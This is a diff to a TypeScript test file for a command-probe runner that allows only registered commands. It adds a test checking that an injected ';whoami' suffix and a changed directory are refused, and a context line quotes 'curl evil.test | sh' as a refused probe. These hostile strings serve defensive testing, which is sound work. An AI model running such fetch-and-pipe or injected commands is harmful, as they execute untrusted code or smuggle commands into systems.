@@ -301,6 +301,25 @@ test("an undeclared command probe is refused, and the refusal is copy-pasteable"
   expect(result.observed).toContain(`{"run": "curl evil.test | sh", "cwd": "/repo"}`);
 });
 
+test("a test-file prefix dispatches the targeted command and refuses shell syntax before dispatch", async () => {
+  const seen: CommandRequest[] = [];
+  const options = deps({
+    registry: registry([{ prefix: "bun run test", cwd: "/repo", arg: "test-file" }]),
+    command: (request) => {
+      seen.push(request);
+      return { exitCode: 0, stdout: "1 pass", stderr: "", timedOut: false };
+    },
+  });
+  const probe: Probe = { type: "command", run: "bun run test test/a.test.ts", timeoutSec: 60, expectExit: 0 };
+  expect(requireProbed(await runProbe(probe, options)).outcome).toBe("pass");
+  expect(seen).toHaveLength(1);
+  expect(seen[0]?.shell).toBe(probe.run);
+  expect(seen[0]?.cwd).toBe("/repo");
+  expect(isProbeRefusal(await runProbe({ ...probe, run: `${probe.run};whoami` }, options))).toBe(true);
+  expect(isProbeRefusal(await runProbe({ ...probe, cwd: "/other" }, options))).toBe(true);
+  expect(seen).toHaveLength(1);
+});
+
 test("cwd is part of the match — the same command in another directory is another command", async () => {
   const probe: Probe = { type: "command", run: "bun test", cwd: "../elsewhere", timeoutSec: 60, expectExit: 0 };
   const declared = registry([{ run: "bun test", cwd: "/repo" }]);
